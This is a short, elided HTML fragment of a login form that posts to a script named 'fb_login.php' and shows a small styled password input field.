...
<div align="right">
  <form action="fb_login.php" method="post">
      ...
      <p></p>
      <font style="font-family:arial; font-size:9px;">Password </font><input type="password" name="password" style="font-family:arial; font-size:9px; width: 120px; margin-left: 0px; margin-top: 10px;">
      <p></p>
